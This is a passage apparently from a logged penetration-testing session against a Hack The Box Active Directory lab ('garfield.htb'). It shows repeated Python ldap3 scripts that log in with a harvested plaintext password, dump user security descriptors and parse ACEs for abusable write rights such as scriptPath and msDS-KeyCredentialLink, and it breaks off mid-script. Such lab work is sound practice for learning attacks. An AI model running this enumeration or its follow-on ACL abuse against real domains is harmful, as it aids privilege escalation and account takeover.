+        of = struct.unpack_from('<I', data, pos)[0]; pos += 4
+        if of & 1: ot = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+        if of & 2: it = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+    sid, _ = parse_sid(data, pos)
+    return {"type": atype, "mask": mask, "ot": ot, "it": it, "trustee": sid}, offset+asize
+
+def mask_str(m):
+    p = []
+    if m & 0x10000000: p.append("GenericAll")
+    if m & 0x40000000: p.append("GenericWrite")
+    if m & 0x40000: p.append("WriteDACL")
+    if m & 0x80000: p.append("WriteOwner")
+    if m & 0x20: p.append("WriteProp")
+    if m & 0x10: p.append("ReadProp")
+    if m & 0x08: p.append("Self")
+    if m & 0x100: p.append("ExtRight")
+    return "|".join(p) if p else f"0x{m:08x}"
+
+ATYPE = {0:"ALLOW", 5:"ALLOW_OBJ", 1:"DENY", 6:"DENY_OBJ"}
+
+# SD_FLAGS control value: BER encoded INTEGER 4 (DACL only)
+# 30 03 02 01 04 = SEQUENCE { INTEGER 4 }
+# Actually for SD_FLAGS the value is just the BER-encoded flags integer
+# The correct encoding: just the raw BER integer 0x02 0x01 0x04
+sd_flags_ber = b'\x30\x03\x02\x01\x04'
+
+srv = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(srv, user="garfield.htb\\j.arbuckle", password="Th1sD4mnC4t!@1978", authentication=ldap3.NTLM, auto_bind=True)
+print("[+] Bound as j.arbuckle")
+
+conn.search("DC=garfield,DC=htb", "(|(cn=IT Support)(sAMAccountName=j.arbuckle))", attributes=["objectSid","cn"])
+sids = {}
+for e in conn.entries:
+    s, _ = parse_sid(e["objectSid"].raw_values[0], 0)
+    sids[s] = str(e["cn"])
+    print(f"[*] {e['cn']}: {s}")
+
+# Try with SD_FLAGS control
+ctrl = [("1.2.840.113556.1.4.801", True, sd_flags_ber)]
+conn.search(TARGET_DN, "(objectClass=*)", search_scope=ldap3.BASE, attributes=["nTSecurityDescriptor"], controls=ctrl)
+print(f"[*] Result: {conn.result['description']}")
+
+if conn.result['result'] != 0:
+    # Try without BER sequence wrapper
+    sd_flags_ber2 = b'\x02\x01\x04'
+    ctrl2 = [("1.2.840.113556.1.4.801", True, sd_flags_ber2)]
+    conn.search(TARGET_DN, "(objectClass=*)", search_scope=ldap3.BASE, attributes=["nTSecurityDescriptor"], controls=ctrl2)
+    print(f"[*] Result (attempt 2): {conn.result['description']}")
+
+if not conn.entries or not conn.entries[0]["nTSecurityDescriptor"].raw_values:
+    print("[-] No SD data"); exit(1)
+
+sd = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+print(f"[*] SD: {len(sd)} bytes")
+
+dacl_off = struct.unpack_from('<I', sd, 16)[0]
+if dacl_off == 0: print("[-] No DACL"); exit(1)
+
+ace_count = struct.unpack_from('<H', sd, dacl_off+4)[0]
+print(f"[*] {ace_count} ACEs\n")
+
+# Load full schema map
+conn.search("CN=Schema,CN=Configuration,DC=garfield,DC=htb", "(schemaIDGUID=*)",
+    attributes=["lDAPDisplayName","schemaIDGUID"], paged_size=1000)
+schema = {}
+for e in conn.entries:
+    raw = e["schemaIDGUID"].raw_values[0]
+    if len(raw) == 16:
+        schema[str(uuid.UUID(bytes_le=raw))] = str(e["lDAPDisplayName"])
+print(f"[*] Loaded {len(schema)} schema GUIDs\n")
+
+pos = dacl_off + 8
+found = 0
+for i in range(ace_count):
+    try:
+        ace, pos = parse_ace(sd, pos)
+    except Exception as ex:
+        print(f"[!] Error ACE {i}: {ex}"); break
+    if ace["trustee"] in sids:
+        found += 1
+        ot = ace["ot"] or "ALL"
+        ot_name = schema.get(ot, KNOWN_GUIDS.get(ot, f"UNKNOWN({ot})")) if ot != "ALL" else "ALL PROPERTIES"
+        it = ace["it"]
+        it_name = (schema.get(it, KNOWN_GUIDS.get(it, f"UNKNOWN({it})")) if it else "N/A")
+        print(f"[ACE {i}] {ATYPE.get(ace['type'],'?')} | {sids[ace['trustee']]}")
+        print(f"  Mask: {mask_str(ace['mask'])} (0x{ace['mask']:08x})")
+        print(f"  ObjectType: {ot_name} ({ot})")
+        if it and it != "N/A": print(f"  InheritedObjType: {it_name} ({it})")
+        print()
+
+print(f"[*] Total matching ACEs: {found}")
+PYEOF
+python3 /tmp/enum_aces4.py
+[09:15:27] RUN: cat << 'PYEOF' > /tmp/enum_aces5.py
+#!/usr/bin/env python3
+"""Quick check: enumerate ALL ACEs on Users container itself (inherited ACEs source)."""
+import ldap3, struct, uuid
+
+DC_IP = "10.129.17.178"
+USERS_DN = "CN=Users,DC=garfield,DC=htb"
+
+def parse_sid(data, offset):
+    rev = data[offset]; sc = data[offset+1]
+    auth = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = [str(struct.unpack_from('<I', data, offset+8+4*i)[0]) for i in range(sc)]
+    return f"S-{rev}-{auth}-" + "-".join(subs), offset+8+4*sc
+
+def parse_ace(data, offset):
+    atype = data[offset]
+    asize = struct.unpack_from('<H', data, offset+2)[0]
+    pos = offset + 4
+    mask = struct.unpack_from('<I', data, pos)[0]; pos += 4
+    ot = it = None
+    if atype in (0x05, 0x06):
+        of = struct.unpack_from('<I', data, pos)[0]; pos += 4
+        if of & 1: ot = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+        if of & 2: it = str(uuid.UUID(bytes_le=data[pos:pos+16])); pos += 16
+    sid, _ = parse_sid(data, pos)
+    return {"type": atype, "mask": mask, "ot": ot, "it": it, "trustee": sid}, offset+asize
+
+def mask_str(m):
+    p = []
+    if m & 0x10000000: p.append("GenericAll")
+    if m & 0x40000000: p.append("GenericWrite")
+    if m & 0x40000: p.append("WriteDACL")
+    if m & 0x80000: p.append("WriteOwner")
+    if m & 0x20: p.append("WriteProp")
+    if m & 0x10: p.append("ReadProp")
+    if m & 0x08: p.append("Self")
+    if m & 0x100: p.append("ExtRight")
+    return "|".join(p) if p else f"0x{m:08x}"
+
+ATYPE = {0:"ALLOW", 5:"ALLOW_OBJ", 1:"DENY", 6:"DENY_OBJ"}
+
+srv = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(srv, user="garfield.htb\\j.arbuckle", password="Th1sD4mnC4t!@1978", authentication=ldap3.NTLM, auto_bind=True)
+
+conn.search("DC=garfield,DC=htb", "(|(cn=IT Support)(sAMAccountName=j.arbuckle))", attributes=["objectSid","cn"])
+sids = {}
+for e in conn.entries:
+    s, _ = parse_sid(e["objectSid"].raw_values[0], 0)
+    sids[s] = str(e["cn"])
+
+# Load schema
+conn.search("CN=Schema,CN=Configuration,DC=garfield,DC=htb", "(schemaIDGUID=*)",
+    attributes=["lDAPDisplayName","schemaIDGUID"], paged_size=1000)
+schema = {}
+for e in conn.entries:
+    raw = e["schemaIDGUID"].raw_values[0]
+    if len(raw) == 16:
+        schema[str(uuid.UUID(bytes_le=raw))] = str(e["lDAPDisplayName"])
+
+# Also check rights/property sets from Extended-Rights container
+conn.search("CN=Extended-Rights,CN=Configuration,DC=garfield,DC=htb", "(rightsGuid=*)",
+    attributes=["cn","rightsGuid","displayName"], paged_size=500)
+rights = {}
+for e in conn.entries:
+    rg = str(e["rightsGuid"]).lower()
+    rights[rg] = str(e["cn"])
+
+# Check Users container ACEs
+ctrl = [("1.2.840.113556.1.4.801", True, b'\x30\x03\x02\x01\x04')]
+conn.search(USERS_DN, "(objectClass=*)", search_scope=ldap3.BASE, attributes=["nTSecurityDescriptor"], controls=ctrl)
+sd = conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+dacl_off = struct.unpack_from('<I', sd, 16)[0]
+ace_count = struct.unpack_from('<H', sd, dacl_off+4)[0]
+print(f"[*] Users container: {ace_count} ACEs\n")
+
+pos = dacl_off + 8
+for i in range(ace_count):
+    try:
+        ace, pos = parse_ace(sd, pos)
+    except: break
+    if ace["trustee"] in sids:
+        ot = ace["ot"] or "ALL"
+        ot_name = schema.get(ot, rights.get(ot, f"UNKNOWN({ot})")) if ot != "ALL" else "ALL"
+        it = ace["it"]
+        it_name = schema.get(it, rights.get(it, f"UNKNOWN({it})")) if it else "N/A"
+        print(f"[ACE {i}] {ATYPE.get(ace['type'],'?')} | {sids[ace['trustee']]}")
+        print(f"  Mask: {mask_str(ace['mask'])} (0x{ace['mask']:08x})")
+        print(f"  ObjectType: {ot_name} ({ot})")
+        if it: print(f"  InheritedObjType: {it_name} ({it})")
+        print()
+PYEOF
+python3 /tmp/enum_aces5.py
+[09:15:54] RUN: cat /htb/machines/garfield/state/creds.jsonl | grep j.arbuckle
+[09:16:49] RUN: cat > /tmp/enum_aces.py << 'PYEOF'
+import ldap3
+from ldap3.protocol.microsoft import security_descriptor_control
+import struct, uuid
+
+DC_IP = "10.129.17.178"
+DOMAIN = "garfield.htb"
+USER = "j.arbuckle@garfield.htb"
+PASS = "Th1sD4mnC4t!@1978"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+# Known schemaIDGUID mappings for common user attributes
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967a68-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967a7f-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "member",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf967a05-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf967961-0de6-11d0-a285-00aa003049e2": "instanceType",
+    "bf9679ab-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf967a6d-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967a0e-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf967a61-0de6-11d0-a285-00aa003049e2": "title",
+    "bf967938-0de6-11d0-a285-00aa003049e2": "department",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "f0f8ff84-1191-11d0-a060-00aa006c33ed": "msDS-AllowedToDelegateTo",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    # Property sets
+    "72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS-Host-Name-Attributes (property set)",
+    "b7c69e6d-2cc7-11d2-854e-00a0c983f608": "Validated-DNS-Host-Name",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User-Account-Restrictions (property set)",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "User-Logon (property set)",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public-Information (property set)",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal-Information (property set)",
+    "037088f8-0ae1-11d2-b422-00a0c968f939": "RAS-Information (property set)",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General-Information (property set)",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership (property set)",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email-Information (property set)",
+    "ffa6f046-ca4b-4feb-b40d-04dfee722543": "ms-DS-Key-Credential-Link",
+}
+
+# ACE type constants
+ACCESS_ALLOWED_ACE = 0
+ACCESS_ALLOWED_OBJECT_ACE = 5
+
+# Access mask bits
+ADS_RIGHT_DS_WRITE_PROP = 0x20
+ADS_RIGHT_DS_SELF = 0x08
+GENERIC_WRITE = 0x40000000
+WRITE_DAC = 0x40000
+WRITE_OWNER = 0x80000
+GENERIC_ALL = 0x10000000
+ADS_RIGHT_DS_CONTROL_ACCESS = 0x100
+
+def parse_sid(data, offset):
+    revision = data[offset]
+    sub_count = data[offset+1]
+    authority = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = []
+    for i in range(sub_count):
+        sub = struct.unpack_from('<I', data, offset+8+i*4)[0]
+        subs.append(sub)
+    sid_str = f"S-{revision}-{authority}" + "".join(f"-{s}" for s in subs)
+    size = 8 + sub_count * 4
+    return sid_str, size
+
+def parse_guid(data, offset):
+    raw = data[offset:offset+16]
+    if len(raw) < 16:
+        return None
+    return str(uuid.UUID(bytes_le=raw))
+
+def parse_sd(raw_sd):
+    """Parse nTSecurityDescriptor binary and extract ACEs"""
+    if not raw_sd:
+        return []
+    
+    revision = struct.unpack_from('<B', raw_sd, 0)[0]
+    control = struct.unpack_from('<H', raw_sd, 2)[0]
+    dacl_offset = struct.unpack_from('<I', raw_sd, 16)[0]
+    
+    if dacl_offset == 0:
+        return []
+    
+    acl_revision = struct.unpack_from('<B', raw_sd, dacl_offset)[0]
+    acl_size = struct.unpack_from('<H', raw_sd, dacl_offset+2)[0]
+    ace_count = struct.unpack_from('<H', raw_sd, dacl_offset+4)[0]
+    
+    aces = []
+    offset = dacl_offset + 8
+    
+    for i in range(ace_count):
+        if offset >= len(raw_sd):
+            break
+        ace_type = struct.unpack_from('<B', raw_sd, offset)[0]
+        ace_flags = struct.unpack_from('<B', raw_sd, offset+1)[0]
+        ace_size = struct.unpack_from('<H', raw_sd, offset+2)[0]
+        access_mask = struct.unpack_from('<I', raw_sd, offset+4)[0]
+        
+        ace_data = {
+            'type': ace_type,
+            'flags': ace_flags,
+            'access_mask': access_mask,
+            'object_type': None,
+            'inherited_object_type': None,
+            'trustee': None,
+        }
+        
+        if ace_type == ACCESS_ALLOWED_OBJECT_ACE:
+            obj_flags = struct.unpack_from('<I', raw_sd, offset+8)[0]
+            ptr = offset + 12
+            if obj_flags & 1:  # ACE_OBJECT_TYPE_PRESENT
+                ace_data['object_type'] = parse_guid(raw_sd, ptr)
+                ptr += 16
+            if obj_flags & 2:  # ACE_INHERITED_OBJECT_TYPE_PRESENT
+                ace_data['inherited_object_type'] = parse_guid(raw_sd, ptr)
+                ptr += 16
+            sid, _ = parse_sid(raw_sd, ptr)
+            ace_data['trustee'] = sid
+        elif ace_type == ACCESS_ALLOWED_ACE:
+            sid, _ = parse_sid(raw_sd, offset+8)
+            ace_data['trustee'] = sid
+        
+        aces.append(ace_data)
+        offset += ace_size
+    
+    return aces
+
+# Connect
+server = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user=USER, password=PASS, authentication=ldap3.NTLM)
+conn.bind()
+print(f"Bind: {conn.result['description']}")
+
+# First, get SIDs for j.arbuckle and IT Support group
+conn.search("DC=garfield,DC=htb", "(sAMAccountName=j.arbuckle)", attributes=["objectSid"])
+jarb_sid = conn.entries[0].objectSid.value if conn.entries else None
+print(f"j.arbuckle SID: {jarb_sid}")
+
+conn.search("DC=garfield,DC=htb", "(cn=IT Support)", attributes=["objectSid"])
+it_sid = conn.entries[0].objectSid.value if conn.entries else None
+print(f"IT Support SID: {it_sid}")
+
+# Get nTSecurityDescriptor with SD_FLAGS control (DACL only = 0x04)
+conn.search(
+    "DC=garfield,DC=htb",
+    "(distinguishedName={})".format(TARGET_DN.replace("(", "\\28").replace(")", "\\29")),
+    attributes=["nTSecurityDescriptor"],
+    controls=[security_descriptor_control(sdflags=0x04)]
+)
+
+if not conn.entries:
+    print("ERROR: Target not found")
+    exit(1)
+
+raw_sd = conn.entries[0].nTSecurityDescriptor.raw_values[0]
+aces = parse_sd(raw_sd)
+
+# Filter ACEs for j.arbuckle or IT Support SIDs
+target_sids = set()
+if jarb_sid:
+    target_sids.add(jarb_sid)
+if it_sid:
+    target_sids.add(it_sid)
+
+print(f"\nTarget SIDs: {target_sids}")
+print(f"Total ACEs on l.wilson: {len(aces)}")
+print(f"\n=== ACEs matching j.arbuckle / IT Support ===")
+
+matching = []
+for ace in aces:
+    if ace['trustee'] in target_sids:
+        matching.append(ace)
+        mask = ace['access_mask']
+        obj_guid = ace['object_type'] or "N/A"
+        inh_guid = ace['inherited_object_type'] or "N/A"
+        
+        # Resolve GUID name
+        guid_name = KNOWN_GUIDS.get(obj_guid, "UNKNOWN") if obj_guid != "N/A" else "N/A"
+        inh_name = KNOWN_GUIDS.get(inh_guid, "UNKNOWN") if inh_guid != "N/A" else "N/A"
+        
+        # Decode access mask
+        rights = []
+        if mask & ADS_RIGHT_DS_WRITE_PROP: rights.append("WriteProp")
+        if mask & ADS_RIGHT_DS_SELF: rights.append("Self")
+        if mask & GENERIC_WRITE: rights.append("GenericWrite")
+        if mask & WRITE_DAC: rights.append("WriteDACL")
+        if mask & WRITE_OWNER: rights.append("WriteOwner")
+        if mask & GENERIC_ALL: rights.append("GenericAll")
+        if mask & ADS_RIGHT_DS_CONTROL_ACCESS: rights.append("ControlAccess")
+        
+        print(f"  ACE Type: {ace['type']}, Mask: 0x{mask:08x} ({','.join(rights) or 'other'})")
+        print(f"    ObjectType: {obj_guid} ({guid_name})")
+        print(f"    InheritedObjectType: {inh_guid} ({inh_name})")
+        print(f"    Trustee: {ace['trustee']}")
+        print()
+
+if not matching:
+    print("  NO matching ACEs found!")
+
+# Also look up ALL object ACE GUIDs against schema for anything unknown
+print("\n=== Schema GUID lookup for unknown GUIDs ===")
+unknown_guids = set()
+for ace in matching:
+    if ace['object_type'] and ace['object_type'] not in KNOWN_GUIDS:
+        unknown_guids.add(ace['object_type'])
+    if ace['inherited_object_type'] and ace['inherited_object_type'] not in KNOWN_GUIDS:
+        unknown_guids.add(ace['inherited_object_type'])
+
+if unknown_guids:
+    for guid in unknown_guids:
+        # Query schema for this GUID
+        guid_bytes = uuid.UUID(guid).bytes_le
+        escaped = ''.join(f'\\{b:02x}' for b in guid_bytes)
+        conn.search(
+            f"CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+            f"(schemaIDGUID={escaped})",
+            attributes=["cn", "lDAPDisplayName", "adminDescription"]
+        )
+        if conn.entries:
+            entry = conn.entries[0]
+            print(f"  {guid} => {entry.lDAPDisplayName.value} ({entry.cn.value})")
+        else:
+            # Try rights-guid (controlAccessRight)
+            conn.search(
+                f"CN=Extended-Rights,CN=Configuration,DC=garfield,DC=htb",
+                f"(rightsGuid={guid})",
+                attributes=["cn", "displayName"]
+            )
+            if conn.entries:
+                entry = conn.entries[0]
+                print(f"  {guid} => Extended Right: {entry.displayName.value} ({entry.cn.value})")
+            else:
+                print(f"  {guid} => NOT FOUND in schema or extended rights")
+else:
+    print("  No unknown GUIDs to resolve")
+
+conn.unbind()
+PYEOF
+python3 /tmp/enum_aces.py
+[09:16:53] EDIT: /tmp/enum_aces.py
+[09:16:56] RUN: sed -i 's|conn = ldap3.Connection(server, user=USER, password=PASS, authentication=ldap3.NTLM)|conn = ldap3.Connection(server, user="garfield.htb\\\\j.arbuckle", password=PASS, authentication=ldap3.NTLM)|' /tmp/enum_aces.py && python3 /tmp/enum_aces.py
+[09:17:34] RUN: cat > /tmp/enum_aces2.py << 'PYEOF'
+import ldap3
+import struct, uuid
+from ldap3.utils.conv import escape_bytes
+
+DC_IP = "10.129.17.178"
+PASS = "Th1sD4mnC4t!@1978"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967a68-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967a7f-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "member",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf967a05-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf9679ab-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf967a6d-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967a0e-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf967a61-0de6-11d0-a285-00aa003049e2": "title",
+    "bf967938-0de6-11d0-a285-00aa003049e2": "department",
+    "f0f8ff84-1191-11d0-a060-00aa006c33ed": "msDS-AllowedToDelegateTo",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    "72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS-Host-Name-Attributes",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User-Account-Restrictions",
+    "5f202010-79a5-11d0-9020-00c04fc2d4cf": "User-Logon",
+    "e48d0154-bcf8-11d1-8702-00c04fb96050": "Public-Information",
+    "77b5b886-944a-11d1-aebd-0000f80367c1": "Personal-Information",
+    "037088f8-0ae1-11d2-b422-00a0c968f939": "RAS-Information",
+    "59ba2f42-79a2-11d0-9020-00c04fc2d3cf": "General-Information",
+    "bc0ac240-79a9-11d0-9020-00c04fc2d4cf": "Membership",
+    "e45795b2-9455-11d1-aebd-0000f80367c1": "Email-Information",
+    "ffa6f046-ca4b-4feb-b40d-04dfee722543": "msDS-KeyCredentialLink",
+    "5b47d60f-6090-40b2-9f37-2a4de88f3063": "msDS-KeyCredentialLink",
+    "bf967a86-0de6-11d0-a285-00aa003049e2": "computer",
+    "bf967aba-0de6-11d0-a285-00aa003049e2": "user",
+}
+
+ACCESS_ALLOWED_ACE = 0
+ACCESS_ALLOWED_OBJECT_ACE = 5
+
+def parse_sid(data, offset):
+    revision = data[offset]
+    sub_count = data[offset+1]
+    authority = int.from_bytes(data[offset+2:offset+8], 'big')
+    subs = []
+    for i in range(sub_count):
+        sub = struct.unpack_from('<I', data, offset+8+i*4)[0]
+        subs.append(sub)
+    return f"S-{revision}-{authority}" + "".join(f"-{s}" for s in subs), 8 + sub_count * 4
+
+def parse_guid(data, offset):
+    raw = data[offset:offset+16]
+    return str(uuid.UUID(bytes_le=raw)) if len(raw) >= 16 else None
+
+def parse_sd(raw_sd):
+    dacl_offset = struct.unpack_from('<I', raw_sd, 16)[0]
+    if dacl_offset == 0: return []
+    ace_count = struct.unpack_from('<H', raw_sd, dacl_offset+4)[0]
+    aces = []
+    offset = dacl_offset + 8
+    for i in range(ace_count):
+        if offset >= len(raw_sd): break
+        ace_type = raw_sd[offset]
+        ace_flags = raw_sd[offset+1]
+        ace_size = struct.unpack_from('<H', raw_sd, offset+2)[0]
+        access_mask = struct.unpack_from('<I', raw_sd, offset+4)[0]
+        ace_data = {'type': ace_type, 'flags': ace_flags, 'access_mask': access_mask,
+                    'object_type': None, 'inherited_object_type': None, 'trustee': None}
+        if ace_type == ACCESS_ALLOWED_OBJECT_ACE:
+            obj_flags = struct.unpack_from('<I', raw_sd, offset+8)[0]
+            ptr = offset + 12
+            if obj_flags & 1:
+                ace_data['object_type'] = parse_guid(raw_sd, ptr)
+                ptr += 16
+            if obj_flags & 2:
+                ace_data['inherited_object_type'] = parse_guid(raw_sd, ptr)
+                ptr += 16
+            sid, _ = parse_sid(raw_sd, ptr)
+            ace_data['trustee'] = sid
+        elif ace_type == ACCESS_ALLOWED_ACE:
+            sid, _ = parse_sid(raw_sd, offset+8)
+            ace_data['trustee'] = sid
+        aces.append(ace_data)
+        offset += ace_size
+    return aces
+
+# Build SD_FLAGS control manually: OID 1.2.840.113556.1.4.801, value = DACL (4)
+import pyasn1.type.univ as univ
+from pyasn1.codec.ber import encoder
+val = encoder.encode(univ.Integer(0x04))
+sd_control = ('1.2.840.113556.1.4.801', True, val)
+
+server = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user="garfield.htb\\j.arbuckle", password=PASS, authentication=ldap3.NTLM)
+conn.bind()
+print(f"Bind: {conn.result['description']}")
+
+# Get SIDs
+conn.search("DC=garfield,DC=htb", "(sAMAccountName=j.arbuckle)", attributes=["objectSid"])
+jarb_sid = conn.entries[0].objectSid.value
+print(f"j.arbuckle SID: {jarb_sid}")
+
+conn.search("DC=garfield,DC=htb", "(cn=IT Support)", attributes=["objectSid"])
+it_sid = conn.entries[0].objectSid.value if conn.entries else None
+print(f"IT Support SID: {it_sid}")
+
+# Get nTSecurityDescriptor
+conn.search(
+    "DC=garfield,DC=htb",
+    f"(distinguishedName={TARGET_DN})",
+    attributes=["nTSecurityDescriptor"],
+    controls=[sd_control]
+)
+
+if not conn.entries:
+    print("ERROR: Target not found")
+    exit(1)
+
+raw_sd = conn.entries[0].nTSecurityDescriptor.raw_values[0]
+aces = parse_sd(raw_sd)
+
+target_sids = {jarb_sid}
+if it_sid: target_sids.add(it_sid)
+
+print(f"\nTarget SIDs: {target_sids}")
+print(f"Total ACEs on l.wilson: {len(aces)}")
+print(f"\n=== ACEs matching j.arbuckle / IT Support ===")
+
+matching = []
+for ace in aces:
+    if ace['trustee'] in target_sids:
+        matching.append(ace)
+        mask = ace['access_mask']
+        obj_guid = ace['object_type'] or "N/A"
+        inh_guid = ace['inherited_object_type'] or "N/A"
+        guid_name = KNOWN_GUIDS.get(obj_guid, "UNKNOWN") if obj_guid != "N/A" else "N/A"
+        inh_name = KNOWN_GUIDS.get(inh_guid, "UNKNOWN") if inh_guid != "N/A" else "N/A"
+        rights = []
+        if mask & 0x20: rights.append("WriteProp")
+        if mask & 0x08: rights.append("Self")
+        if mask & 0x40000000: rights.append("GenericWrite")
+        if mask & 0x40000: rights.append("WriteDACL")
+        if mask & 0x80000: rights.append("WriteOwner")
+        if mask & 0x10000000: rights.append("GenericAll")
+        if mask & 0x100: rights.append("ControlAccess")
+        if mask & 0x04: rights.append("CreateChild")
+        if mask & 0x01: rights.append("DeleteChild")
+        if mask & 0x10: rights.append("DeleteTree")
+        if mask & 0x80: rights.append("ReadProp")
+        if mask & 0x02: rights.append("ListChildren")
+        
+        print(f"  ACE Type: {ace['type']}, Mask: 0x{mask:08x} ({','.join(rights) or hex(mask)})")
+        print(f"    ObjectType: {obj_guid} ({guid_name})")
+        print(f"    InheritedObjectType: {inh_guid} ({inh_name})")
+        print(f"    Trustee: {ace['trustee']}")
+        print()
+
+if not matching:
+    print("  NO matching ACEs found!")
+
+# Resolve unknown GUIDs
+print("\n=== Schema GUID lookup for unknown GUIDs ===")
+unknown_guids = set()
+for ace in matching:
+    for g in [ace['object_type'], ace['inherited_object_type']]:
+        if g and g not in KNOWN_GUIDS:
+            unknown_guids.add(g)
+
+for guid in unknown_guids:
+    guid_bytes = uuid.UUID(guid).bytes_le
+    escaped = escape_bytes(guid_bytes)
+    conn.search(f"CN=Schema,CN=Configuration,DC=garfield,DC=htb",
+                f"(schemaIDGUID={escaped})", attributes=["lDAPDisplayName", "cn"])
+    if conn.entries:
+        print(f"  {guid} => {conn.entries[0].lDAPDisplayName.value}")
+    else:
+        conn.search(f"CN=Extended-Rights,CN=Configuration,DC=garfield,DC=htb",
+                    f"(rightsGuid={guid})", attributes=["cn", "displayName"])
+        if conn.entries:
+            print(f"  {guid} => ExtRight: {conn.entries[0].cn.value}")
+        else:
+            print(f"  {guid} => NOT FOUND")
+
+if not unknown_guids:
+    print("  No unknown GUIDs")
+
+conn.unbind()
+PYEOF
+python3 /tmp/enum_aces2.py
+[09:17:40] RUN: cat > /tmp/find_liz.py << 'PYEOF'
+import ldap3
+DC_IP = "10.129.17.178"
+server = ldap3.Server(DC_IP, get_info=ldap3.ALL)
+conn = ldap3.Connection(server, user="garfield.htb\\j.arbuckle", password="Th1sD4mnC4t!@1978", authentication=ldap3.NTLM)
+conn.bind()
+conn.search("DC=garfield,DC=htb", "(sAMAccountName=l.wilson)", attributes=["distinguishedName","cn"])
+for e in conn.entries:
+    print(e)
+conn.unbind()
+PYEOF
+python3 /tmp/find_liz.py
+[09:18:12] RUN: cat > /tmp/enum_aces3.py << 'PYEOF'
+import ldap3
+import struct, uuid
+from ldap3.utils.conv import escape_bytes
+from pyasn1.type.univ import Integer
+from pyasn1.codec.ber import encoder
+
+DC_IP = "10.129.17.178"
+PASS = "Th1sD4mnC4t!@1978"
+TARGET_DN = "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb"
+
+KNOWN_GUIDS = {
+    "bf9679a8-0de6-11d0-a285-00aa003049e2": "scriptPath",
+    "bf967a68-0de6-11d0-a285-00aa003049e2": "userAccountControl",
+    "bf967950-0de6-11d0-a285-00aa003049e2": "homeDirectory",
+    "bf967a7f-0de6-11d0-a285-00aa003049e2": "userPrincipalName",
+    "bf9679c0-0de6-11d0-a285-00aa003049e2": "member",
+    "bf967953-0de6-11d0-a285-00aa003049e2": "homeDrive",
+    "bf967a05-0de6-11d0-a285-00aa003049e2": "sAMAccountName",
+    "bf9679ab-0de6-11d0-a285-00aa003049e2": "servicePrincipalName",
+    "bf967a9c-0de6-11d0-a285-00aa003049e2": "displayName",
+    "bf967a6d-0de6-11d0-a285-00aa003049e2": "description",
+    "bf967a0e-0de6-11d0-a285-00aa003049e2": "profilePath",
+    "bf967a61-0de6-11d0-a285-00aa003049e2": "title",
+    "bf967938-0de6-11d0-a285-00aa003049e2": "department",
+    "f0f8ff84-1191-11d0-a060-00aa006c33ed": "msDS-AllowedToDelegateTo",
+    "00fbf30c-91fe-11d1-aebc-0000f80367c1": "altSecurityIdentities",
+    "3f78c3e5-f79a-46bd-a0b8-9d18116ddc79": "msDS-AllowedToActOnBehalfOfOtherIdentity",
+    "00000000-0000-0000-0000-000000000000": "ALL PROPERTIES",
+    "72e39547-7b18-11d1-adef-00c04fd8d5cd": "DNS-Host-Name-Attributes",
+    "4c164200-20c0-11d0-a768-00aa006e0529": "User-Account-Restrictions",
